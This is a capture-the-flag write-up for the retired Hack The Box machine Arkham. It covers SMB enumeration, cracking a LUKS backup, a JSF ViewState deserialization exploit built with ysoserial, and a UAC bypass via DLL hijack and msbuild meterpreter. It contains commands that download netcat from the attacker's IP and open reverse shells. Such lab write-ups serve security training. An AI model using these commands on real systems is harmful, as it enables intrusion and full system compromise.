# Arkham

This is the write-up for the box Arkham that got retired at the 10th August 2019.
My IP address was 10.10.13.112 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.130    arkham.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/arkham.nmap 10.10.10.130
```

```markdown
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8080/tcp open  http          Apache Tomcat 8.5.37
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-15 13:48:33
|_  start_date: N/A
```

## Checking HTTP (Port 80 and port 8080)

The web page on port 80 has just the default IIS site, so let's check port 8080.

### Checking HTTP (Port 8080)

The Apache Tomcat website contains some company website where most links are not working but one does.
If we click on _subscription_ we get forwarded to the path /userSubscribe.faces.

We send that to Burpsuite to examine this more. The parameter **javax.faces.ViewState** has this string:

```markdown
javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RcVjhMDN4sZB70KtDtngjDm0mNzA9qHjYerxo0jW7zu11SwN%2Ft3lVW5GSeZ1PEA3OZ3jFUE%3D
```

If we Bas64 decode this we get non-readable strings, so it seems like this is encrypted in any way. As we now don't know how right now, we can continue with the other services.

## Checking SMB (Port 445)

Try which SMB shares are on the server with the _anonymous_ user:

```markdown
smbmap -H 10.10.10.130 -u anonymous
```

We enumerated some shares and have read access on:
- IPC$
- BatShare
- Users

```markdown
smbclient -U anonymous //10.10.10.130/batshare
```

There is one file named **appserver.zip**, so we download this and unzip it our local machine.

```markdown
unzip appserver.zip
```

### Checking appserver.zip

In this file there are two files:
- IMPORTANT.txt
- backup.img

IMPORTANT.txt says:
> Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce

It seems like we should mount the _backup.img_ to get more information. Let's check what kind of file this is:

```markdown
file backup.img
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

With the tool **cryptsetup** we can examine LUKS encrypted files and this commands tells us that the payload offset is at 4096.
```markdown
cryptsetup luksDump backup.img
```

With that information we can get the header:
```markdown
dd if=backup.img of=arkham-luks bs=512 count=4097
```

Now we need to crack the password:
```markdown
hashcat -m 14600 arkham-luks /usr/share/wordlists/rockyou.txt
```

The cracked password is:
> batmanforever

Now we can mount the _backup.img_:
```markdown
cryptsetup luksOpen backup.img arkham
mount /dev/mapper/arkham /mnt
```

In the _/mnt_ directory we now have the Folder **Mask** in which we find pictures of Batman characters and some tomcat configuration files in the folder _tomcat-stuff_.
After comparing the files _web.xml_ and _web.xml.bak_, we see that those files are very different. In the latter file we find this information:

```markdown
org.apache.myfaces.SECRET: SnNGOTg3Ni0=
org.apache.myfaces.MAC_ALGORITHM: HmacSHA1
```

We write a script that can decrypt the value in the _javax.faces.ViewState_ parameter. 

#### Information about the script

I call this script **arkham-exploit.py** and it can be found in this repository.

The payload in it got created with the tool **ysoserial**. Here are some commands I used:

- Check ysoserial for all payload types:
```markdown
java -jar ysoserial-master-SNAPSHOT.jar
```

- Use the "CommonsCollection5" and put your payload in there:
```markdown
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 1 10.10.13.112' > ~/htb/boxes/arkham/payload.bin
```

This payload just pings my local machine, so we can test if the real payload will work. After testing the "ping"-payload, we replace that line in the code, so we can inject our own commands.

We convert the _payload.bin_ into hex, so it is easier to put it inside of the script:
```markdown
for i in $(xxd -p payload.bin | sed 's/../\\x&/g'); do echo "payload += b'$i'"; done
```

## Getting a reverse shell

After executing the script we can inject any commands we want and we want a reverse shell. First we upload _netcat_ on the machine and the we execute it.
```markdown
powershell Invoke-WebRequest -Uri http://10.10.13.112/nc.exe -OutFile C:\\windows\\temp\\nc.exe
cmd /c C:\\windows\\temp\\nc.exe 10.10.13.112 9001 -e powershell.exe
```

We now have a working reverse shell and are logged in as the user _Alfred_. He can read user.txt!

## Privilege Escalation

First check all files in Alfreds home folder:
```markdown
Get-ChildItem -recurse . | select Fullname
```

The one interesting file is _backup.zip_ so let's bring that to our local machine by base64-decoding it and copying the contents:
```markdown
certutil -encode \Users\Alfred\Downloads\backups\backup.zip C:\\Windows\\temp\backup.b64
```

Decode it:
```markdown
base64 -d backup.b64 > backup.zip
```

After unzipping the file we find one interesting file in it called _alfred@arkham.local.ost_. This is an Exchange mailbox file, so we convert it into a .mbox file with this command:
```markdown
readpst alfred@arkham.local.ost
```

This file can be opened with any mail client like Thunderbird and it has one email from **Batman** with his password in it!
His password is:
> Zx^#QZX+T!123

Now we can execute commands as the user batman:
```markdown
$pass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("batman",$pass)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
```

This executes _whoami_ as batman and so we can execute other commands. We want to execute Netcat with batman and create a reverse shell with him:
```markdown
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -Uri 10.10.13.112/nc.exe -outfile nc.exe } -credential $cred
Invoke-Command -Computer ARKHAM -ScriptBlock { cmd /c nc.exe 10.10.13.112 9002 -e powershell.exe } -credential $cred
```

### Privilege Escalation to root

Now we have a reverse shell wit batman, so let's check his groups and privileges:
```markdown
whoami /all
```

Batman is a member of Administrators but has less privileges than he should have. This probably means some UAC bypassing.
There is a list of [UAC Bypass on GitHub](https://github.com/hfiref0x/UACME) and I will take the one from egre55.

#### Creating the DLL

First we need to create a DLL. I will call this _main.c_ and put in into this repository. Compiling works like this:
```markdown
i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
```

This created a DLL named _srrstr.dll_ and needs to get copied on the box in the path **C:\Users\Batman\appdata\local\microsoft\windowsapps**. Download the file with Batman:
```markdown
iwr -uri hxxp://10.10.13.112/srrstr.dll -outfile srrstr.dll
```

#### Escalating to interactive session process

To escalate to an interactive sessuion process we use the tool **GreatSCT**. Installation can take some time.
GreatSCT is a simple to use framework, where you have a menu to choose what you want to do by typing the number of the menu you want to be in.

We will first choose the one Tool it has (Bypass):
```markdown
use 1
```

Then choose the payload (msbuild/meterpreter/rev_tcp.py):
```markdown
use 9
```

Now it kind of looks like the options in Metasploit, so we set the host and the port:
```markdown
set LPORT 9001
set LHOST 10.10.13.112
generate
```

It displays where it stored the _payload.rc_ file to use it with Metasploit:
```markdown
msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

The _payload.xml_ needs to get uploaded on the box and can be placed in batmans home directory. We will use this payload with **MsBuild.exe**, but first you need to listen on port 9001:
```markdown
C:\Windows\microsoft.net\Framework\v4.0.30319\msbuild.exe payload.xml
```

After executing _MsBuild.exe_ with the payload we get a meterpreter shell. We can't do much in this shell right now, because we first need to _migrate_ into another process. This can take several tries, but if you got it you can open a _shell_ with meterpreter and need to execute this Windows system internal:

```markdown
cmd /c C:\Windows\SysWow64\SystemPropertiesAdvanced.exe
```

With _whoami /all_ we can now see that we have much more privileges than before.
We have a root shell and we can read root.txt!
